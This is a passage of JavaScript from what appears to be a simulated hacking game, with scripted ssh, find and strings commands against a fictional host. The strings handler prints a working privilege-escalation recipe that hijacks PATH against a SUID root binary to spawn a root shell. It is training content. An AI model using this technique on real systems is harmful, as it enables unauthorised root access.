                    if (!target) return 'Usage: ssh [user@]hostname\nExample: ssh deployer@10.10.20.50';

                    var parts = target.split('@');
                    var user = parts[0];
                    var host = parts[1];

                    if (host === '10.10.20.50' || host === 'megacorp-web01') {
                        if (user === 'deployer') {
                            return 'Warning: Permanently added \'10.10.20.50\' (ED25519) to the list of known hosts.\n' +
                                'deployer@10.10.20.50\'s password:\n' +
                                'Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\n\n' +
                                'Last login: Mon Jan 20 16:42:11 2025 from 10.10.20.1\n' +
                                'deployer@megacorp-web01:~$\n\n' +
                                '[SESSION: You are now on megacorp-web01 as deployer]\n' +
                                'Type \'find / -perm -4000\' to search for SUID binaries.';
                        }
                        return user + '@10.10.20.50: Permission denied (publickey,password).';
                    }
                    return 'ssh: connect to host ' + host + ' port 22: No route to host';
                },

                'find': function(args) {
                    var hasPermFlag = args.join(' ').indexOf('-perm') !== -1;
                    var hasSuid = args.join(' ').indexOf('4000') !== -1;

                    if (hasPermFlag && hasSuid) {
                        return '/usr/bin/passwd\n' +
                            '/usr/bin/sudo\n' +
                            '/usr/bin/chfn\n' +
                            '/usr/bin/chsh\n' +
                            '/usr/bin/newgrp\n' +
                            '/usr/local/bin/mc-backup\n\n' +
                            '[NOTE: /usr/local/bin/mc-backup is a custom SUID binary -- not standard.]\n' +
                            '[Run: strings /usr/local/bin/mc-backup to analyze it.]';
                    }

                    // Handled by Terminal.js filesystem for other find commands
                    return null;
                },

                'strings': function(args) {
                    var target = args.find(function(a) { return !a.startsWith('-'); }) || '';

                    if (target.indexOf('mc-backup') !== -1) {
                        return '/lib64/ld-linux-x86-64.so.2\n' +
                            'libc.so.6\n' +
                            'system\n' +
                            'setuid\n' +
                            'setgid\n' +
                            '__libc_start_main\n' +
                            'GLIBC_2.2.5\n' +
                            'MegaCorp Backup Utility v1.3\n' +
                            'Running backup as root...\n' +
                            'tar -czf /var/backups/megacorp-%s.tar.gz /var/www/megacorp/\n' +
                            'Backup complete.\n\n' +
                            '[ANALYSIS: The binary calls \'tar\' without an absolute path.]\n' +
                            '[EXPLOIT: Create a malicious /tmp/tar, prepend /tmp to PATH, run mc-backup.]\n' +
                            '[This exploits PATH hijacking on a SUID root binary.]\n\n' +
                            'Example exploit:\n' +
                            '  echo \'#!/bin/bash\\n/bin/bash -p\' > /tmp/tar\n' +
                            '  chmod +x /tmp/tar\n' +
                            '  export PATH=/tmp:$PATH\n' +
                            '  /usr/local/bin/mc-backup\n\n' +
                            '[PRIVILEGE ESCALATION FLAG: Root shell obtained -- submit the privilege_escalation flag]';
                    }

                    if (!target) return 'Usage: strings <file>';
                    return 'strings: \'' + target + '\': No such file';
                }
            }
        }
    }
};
